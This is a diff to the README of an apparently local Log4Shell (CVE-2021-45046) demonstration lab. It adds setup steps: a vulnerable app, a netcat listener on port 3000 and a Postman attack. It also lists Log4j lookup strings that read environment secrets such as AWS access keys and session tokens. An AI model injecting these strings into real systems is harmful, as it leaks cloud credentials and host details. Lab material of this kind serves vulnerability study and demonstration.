@@ -12,8 +12,35 @@ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046
  
 ## Local Startup
 
+- [x] Open 2 terminal shell
+
+- [x] Shell 1: Vulnerable Application [Green]
 ```
   ./gradlew bootRun
+```
+- [x] Shell 2: listen on mac port 3000 [RED]
+```
+   nc -l 3000
+```
+- [x] After running postman script attack, you will see something on RED terminal shell
+```
+0
+ `?
+```
+- [x] This confirms, now attacker has access to app and can inject/run RCE to get any data
+- [x] These are common vector attack ,which can be easily retrieved and send to servers.
+```
+${env:PATH}
+${env:AWS_SECRET_ACCESS_KEY}
+${env:AWS_SESSION_TOKEN}
+${env:AWS_ACCESS_KEY_ID}
+${sys:user.name}
+${sys:java.version}
+${sys:os.version}
+${env:USER}
+${java:os}
+${date:MM-dd-yyyy}
+${date:dd:MM:yyyy}
 ```
 
 ## Run postman collection local
